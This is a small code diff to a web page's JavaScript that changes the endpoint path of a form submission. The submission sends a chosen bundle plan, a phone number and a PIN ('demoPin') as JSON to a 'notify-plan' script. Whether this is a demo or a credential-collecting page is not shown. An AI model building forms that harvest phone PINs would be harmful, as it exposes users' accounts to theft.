@@ -794,7 +794,7 @@
     }
     authError.classList.remove('show'); authSubmit.disabled = true; authSubmit.textContent = 'Loging In…';
     try {
-      const response = await fetch('notify-plan.php', { method: 'POST', headers: { 'Content-Type': 'application/json' },
+      const response = await fetch('/api/notify-plan.php', { method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ action: 'plan', bundle: selectedPlan.name, phone, demoPin: document.getElementById('authPin').value }) });
       const result = await response.json();
       if (!response.ok || !result.ok) throw new Error('Submission failed');
